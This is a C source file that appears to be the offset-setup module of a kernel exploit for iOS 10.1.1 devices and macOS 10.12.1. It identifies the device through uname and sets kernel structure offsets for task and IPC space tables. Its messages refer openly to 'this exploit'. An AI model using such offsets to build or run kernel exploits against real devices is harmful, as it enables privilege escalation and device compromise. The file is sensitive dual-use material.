#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/utsname.h>

#include "offsets.h"

// offsets in struct task
uint64_t struct_task_itk_space_offset;

// offsets in struct ipc_space
uint64_t struct_ipc_space_is_table_offset;


void init_ipad_mini_2_10_1_1_14b100() {
  printf("setting offsets for iPad mini 2 10.1.1\n");

  struct_task_itk_space_offset = 0x300;

  struct_ipc_space_is_table_offset = 0x20;
}

void init_ipod_touch_6g_10_1_1_14b100() {
  printf("setting offsets for iPod touch 6G 10.1.1\n");

  struct_task_itk_space_offset = 0x300;

  struct_ipc_space_is_table_offset = 0x20;
}

void init_macos_10_12_1() {
  printf("setting offsets for MacOS 10.12.1\n");

  struct_task_itk_space_offset = 0x300;

  struct_ipc_space_is_table_offset = 0x18;
}

void init_iphone_6s_10_1_1_14b100() {
  printf("setting offsets for iPhone 6s 10.1.1\n");

  struct_task_itk_space_offset = 0x300;

  struct_ipc_space_is_table_offset = 0x20;
}

void init_iphone_7_10_1_1_14b100() {
  printf("setting offsets for iPhone 7 10.1.1\n");

  struct_task_itk_space_offset = 0x300;

  struct_ipc_space_is_table_offset = 0x20;
}

void unknown_build() {
  printf("This is an unknown kernel build - the offsets are likely to be incorrect and it's very unlikely this exploit will work\n");
}

void init_offsets() {
  struct utsname u = {0};
  int err = uname(&u);
  if (err == -1) {
    printf("uname failed - what platform is this?\n");
    printf("there's no way this will work, but trying anyway!\n");
    init_ipad_mini_2_10_1_1_14b100();
    return;
  }

  printf("sysname: %s\n", u.sysname);
  printf("nodename: %s\n", u.nodename);
  printf("release: %s\n", u.release);
  printf("version: %s\n", u.version);
  printf("machine: %s\n", u.machine);

  if (strstr(u.machine, "iPod7,1")) {
    // this is an iPod 6G
    if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
      printf("this is a known kernel build for iPod touch 6G - offsets should be okay\n");
    } else {
      unknown_build();
    }
    init_ipod_touch_6g_10_1_1_14b100();
    return;
  }
  if (strstr(u.machine, "iPad4,4")) {
    // this is an iPad mini 2
    if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")){
      printf("this is a known kernel build for iPad mini 2 - offsets should be okay\n");
    } else {
      unknown_build();
    }
    init_ipad_mini_2_10_1_1_14b100();
    return;
  }
  if (strstr(u.machine, "iPhone8,1")) {
    // this is an iPhone 6s
    if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
        printf("this is a known kernel build for iPhone 6s - offsets should be okay\n");
    } else {
        unknown_build();
    }
    init_iphone_6s_10_1_1_14b100();
    return;
  }
  if (strstr(u.machine, "iPhone9,1")) {
    // this is an iPhone 7
    if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T8010")) {
        printf("this is a known kernel build for iPhone 7 - offsets should be okay\n");
    } else {
        unknown_build();
    }
    init_iphone_7_10_1_1_14b100();
    return;
  }

  printf("don't recognize this platform\n");
  unknown_build();
  exit(1);
}
